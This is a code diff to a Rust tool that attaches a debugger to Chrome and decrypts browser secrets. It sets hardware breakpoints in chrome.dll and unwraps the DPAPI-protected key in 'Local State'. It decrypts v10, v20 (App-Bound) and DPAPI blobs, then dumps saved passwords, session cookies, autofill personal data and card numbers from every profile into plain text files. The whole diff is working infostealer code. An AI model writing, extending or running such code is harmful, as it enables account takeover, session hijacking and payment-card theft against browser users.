@@ -3,11 +3,9 @@
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::System::Diagnostics::Debug::*;
-use windows_sys::Win32::System::Memory::*;
-use windows_sys::Win32::System::LibraryLoader::*;
-use windows_sys::Win32::System::ProcessStatus::*;
 use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::Security::*;
+use windows_sys::Win32::Security::Cryptography::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
 use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
@@ -16,7 +14,7 @@ use std::fs;
 use std::io::Write;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use rusqlite::{Connection};
-use chrono::{DateTime, Utc};
+use chrono::{Utc};
 
 // Some missing definitions from windows-sys that might be architecture specific or in other modules
 #[repr(C)]
@@ -303,7 +301,7 @@ fn main() {
 
 unsafe fn debug_loop(h_process: HANDLE) {
     let mut debug_event: DEBUG_EVENT = zeroed();
-    let mut chrome_dll_base: *mut std::ffi::c_void = null_mut();
+    let mut _chrome_dll_base: *mut std::ffi::c_void = null_mut();
     let mut target_address: usize = 0;
 
     loop {
@@ -320,8 +318,8 @@ unsafe fn debug_loop(h_process: HANDLE) {
                     let path = String::from_utf16_lossy(&buffer[..len as usize]);
                     if path.contains("chrome.dll") {
                         println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
-                        chrome_dll_base = load_dll.lpBaseOfDll;
-                        target_address = find_target_address(h_process, chrome_dll_base);
+                        _chrome_dll_base = load_dll.lpBaseOfDll;
+                        target_address = find_target_address(h_process, _chrome_dll_base);
                         if target_address != 0 {
                             let threads = get_all_threads(debug_event.dwProcessId);
                             println!("Setting hardware breakpoints on {} threads", threads.len());
@@ -516,6 +514,56 @@ unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
     CloseHandle(h_thread);
 }
 
+fn get_v10_key() -> Option<[u8; 32]> {
+    let local_state_path = get_user_data_dir()?.join("Local State");
+    let content = fs::read_to_string(&local_state_path).ok()?;
+    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
+    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
+    let encrypted_key = base64_decode(encrypted_key_b64)?;
+
+    if !encrypted_key.starts_with(b"DPAPI") {
+        return None;
+    }
+
+    let encrypted_blob = &encrypted_key[5..];
+    let mut input = CRYPT_INTEGER_BLOB {
+        cbData: encrypted_blob.len() as u32,
+        pbData: encrypted_blob.as_ptr() as *mut _,
+    };
+    let mut output = CRYPT_INTEGER_BLOB {
+        cbData: 0,
+        pbData: null_mut(),
+    };
+
+    unsafe {
+        if CryptUnprotectData(&mut input, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut output) != 0 {
+            let key_slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
+            let mut key = [0u8; 32];
+            if key_slice.len() == 32 {
+                key.copy_from_slice(key_slice);
+                LocalFree(output.pbData as *mut _);
+                return Some(key);
+            }
+            LocalFree(output.pbData as *mut _);
+        }
+    }
+    None
+}
+
+fn base64_decode(input: &str) -> Option<Vec<u8>> {
+    let input_u16: Vec<u16> = input.encode_utf16().collect();
+    let mut out_len: u32 = 0;
+    unsafe {
+        if CryptStringToBinaryW(input_u16.as_ptr(), input_u16.len() as u32, CRYPT_STRING_BASE64, null_mut(), &mut out_len, null_mut(), null_mut()) != 0 {
+            let mut out = vec![0u8; out_len as usize];
+            if CryptStringToBinaryW(input_u16.as_ptr(), input_u16.len() as u32, CRYPT_STRING_BASE64, out.as_mut_ptr(), &mut out_len, null_mut(), null_mut()) != 0 {
+                return Some(out);
+            }
+        }
+    }
+    None
+}
+
 fn get_user_data_dir() -> Option<PathBuf> {
     let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
     let path = Path::new(&local_app_data)
@@ -548,6 +596,49 @@ fn discover_profiles(user_data_dir: &Path) -> Vec<String> {
     profiles
 }
 
+fn decrypt_blob(blob: &[u8], v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) -> Option<Vec<u8>> {
+    if blob.is_empty() {
+        return None;
+    }
+
+    if blob.starts_with(b"v10") && blob.len() > 15 {
+        if let Some(cipher) = v10_cipher {
+            let nonce = Nonce::from_slice(&blob[3..15]);
+            return cipher.decrypt(nonce, &blob[15..]).ok();
+        }
+    } else if blob.starts_with(b"v20") && blob.len() > 15 {
+        if let Some(cipher) = v20_cipher {
+            let nonce = Nonce::from_slice(&blob[3..15]);
+            if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
+                // v20 (App-Bound) has a 32-byte header in the decrypted plaintext
+                if dec.len() > 32 {
+                    return Some(dec[32..].to_vec());
+                }
+                return Some(dec);
+            }
+        }
+    } else if blob.len() > 15 {
+        // Fallback for some older versions or specific data types that might not have the prefix but use DPAPI directly
+        let mut input = CRYPT_INTEGER_BLOB {
+            cbData: blob.len() as u32,
+            pbData: blob.as_ptr() as *mut _,
+        };
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: null_mut(),
+        };
+        unsafe {
+            if CryptUnprotectData(&mut input, null_mut(), null_mut(), null_mut(), null_mut(), 0, &mut output) != 0 {
+                let dec = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
+                LocalFree(output.pbData as *mut _);
+                return Some(dec);
+            }
+        }
+    }
+
+    None
+}
+
 fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
     let temp_db = std::env::temp_dir().join(format!("chrome_tmp_{}", rand::random::<u32>()));
     if let Err(_) = fs::copy(db_path, &temp_db) {
@@ -563,7 +654,7 @@ fn copy_and_open_db(db_path: &Path) -> Option<(Connection, PathBuf)> {
     }
 }
 
-fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+fn extract_passwords(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
     let db_path = profile_path.join("Login Data");
     if !db_path.exists() { return; }
 
@@ -574,11 +665,8 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm)
 
             for row in rows.flatten() {
                 let (url, user, blob) = row;
-                if blob.starts_with(b"v20") && blob.len() > 15 {
-                    let nonce = Nonce::from_slice(&blob[3..15]);
-                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
-                    }
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                    writeln!(file, "URL: {}\nUser: {}\nPass: {}\n---", url, user, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
         }
@@ -586,7 +674,7 @@ fn extract_passwords(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm)
     }
 }
 
-fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+fn extract_cookies(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
     let mut db_path = profile_path.join("Network").join("Cookies");
     if !db_path.exists() {
         db_path = profile_path.join("Cookies");
@@ -594,17 +682,22 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
     if !db_path.exists() { return; }
 
     if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
-        if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+        if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, value, encrypted_value FROM cookies") {
             let mut file = fs::File::create(output_dir.join("cookies.txt")).unwrap();
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?))).unwrap();
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
 
             for row in rows.flatten() {
-                let (host, name, blob) = row;
-                if blob.starts_with(b"v20") && blob.len() > 15 {
-                    let nonce = Nonce::from_slice(&blob[3..15]);
-                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(&dec)).unwrap();
-                    }
+                let (host, name, value, blob) = row;
+                let cookie_val = if !value.is_empty() {
+                    value
+                } else if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                    String::from_utf8_lossy(&dec).to_string()
+                } else {
+                    String::new()
+                };
+
+                if !cookie_val.is_empty() {
+                    writeln!(file, "Host: {} | Name: {} | Value: {}", host, name, cookie_val).unwrap();
                 }
             }
         }
@@ -612,18 +705,29 @@ fn extract_cookies(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
     }
 }
 
-fn extract_autofill(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) {
+fn extract_autofill(profile_path: &Path, output_dir: &Path, v10_cipher: Option<&Aes256Gcm>, v20_cipher: Option<&Aes256Gcm>) {
     let db_path = profile_path.join("Web Data");
     if !db_path.exists() { return; }
 
     if let Some((conn, temp_path)) = copy_and_open_db(&db_path) {
         let mut file = fs::File::create(output_dir.join("autofill.txt")).unwrap();
 
-        // Profiles
-        if let Ok(mut stmt) = conn.prepare("SELECT name_first, name_last, street_address, city, zipcode, email FROM autofill_profiles") {
-            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, String>(2)?, row.get::<_, String>(3)?, row.get::<_, String>(4)?, row.get::<_, String>(5)?))).unwrap();
+        // Form History
+        if let Ok(mut stmt) = conn.prepare("SELECT name, value FROM autofill") {
+            let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))).unwrap();
             for row in rows.flatten() {
-                writeln!(file, "Profile: {} {} | {}, {}, {} | Email: {}", row.0, row.1, row.2, row.3, row.4, row.5).unwrap();
+                writeln!(file, "Form: {} = {}", row.0, row.1).unwrap();
+            }
+        }
+
+        // Profiles (Modern Schema)
+        let tables = vec!["autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"];
+        for table in tables {
+            if let Ok(mut stmt) = conn.prepare(&format!("SELECT guid, {} FROM {}", if table.contains("name") { "first_name" } else if table.contains("email") { "email" } else { "number" }, table)) {
+                let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))).unwrap();
+                for row in rows.flatten() {
+                    writeln!(file, "{} ({}): {}", table, row.0, row.1).unwrap();
+                }
             }
         }
 
@@ -632,11 +736,8 @@ fn extract_autofill(profile_path: &Path, output_dir: &Path, cipher: &Aes256Gcm) 
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, i32>(1)?, row.get::<_, i32>(2)?, row.get::<_, Vec<u8>>(3)?))).unwrap();
             for row in rows.flatten() {
                 let (name, m, y, blob) = row;
-                if blob.starts_with(b"v20") && blob.len() > 15 {
-                    let nonce = Nonce::from_slice(&blob[3..15]);
-                    if let Ok(dec) = cipher.decrypt(nonce, &blob[15..]) {
-                        writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
-                    }
+                if let Some(dec) = decrypt_blob(&blob, v10_cipher, v20_cipher) {
+                    writeln!(file, "Card: {} | Exp: {}/{} | Num: {}", name, m, y, String::from_utf8_lossy(&dec)).unwrap();
                 }
             }
         }
@@ -654,9 +755,9 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
             let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, i32>(2)?, row.get::<_, i64>(3)?))).unwrap();
 
             for row in rows.flatten() {
-                let (url, title, count, time) = row;
+                let (url, title, count, _time) = row;
                 // Webkit epoch to UTC
-                let dt = Utc::now(); // Placeholder for simplicity
+                let _dt = Utc::now(); // Placeholder for simplicity
                 writeln!(file, "URL: {} | Title: {} | Visits: {}", url, title, count).unwrap();
             }
         }
@@ -664,17 +765,19 @@ fn extract_history(profile_path: &Path, output_dir: &Path) {
     }
 }
 
-fn extract_all_profiles_data(master_key: &[u8; 32]) {
+fn extract_all_profiles_data(v20_key: &[u8; 32]) {
     let user_data_dir = match get_user_data_dir() {
         Some(d) => d,
         None => return,
     };
 
+    let v10_key = get_v10_key();
+    let v10_cipher = v10_key.as_ref().map(|k| Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(k)));
+    let v20_cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(v20_key));
+
     let profiles = discover_profiles(&user_data_dir);
     let extract_root = Path::new("chrome_extract");
     let _ = fs::create_dir_all(extract_root);
-
-    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
 
     for profile_name in profiles {
         println!("Extracting data for profile: {}", profile_name);
@@ -682,9 +785,9 @@ fn extract_all_profiles_data(master_key: &[u8; 32]) {
         let output_dir = extract_root.join(&profile_name);
         let _ = fs::create_dir_all(&output_dir);
 
-        extract_passwords(&profile_path, &output_dir, &cipher);
-        extract_cookies(&profile_path, &output_dir, &cipher);
-        extract_autofill(&profile_path, &output_dir, &cipher);
+        extract_passwords(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
+        extract_cookies(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
+        extract_autofill(&profile_path, &output_dir, v10_cipher.as_ref(), Some(&v20_cipher));
         extract_history(&profile_path, &output_dir);
     }
     println!("Extraction complete. Data saved in chrome_extract folder.");
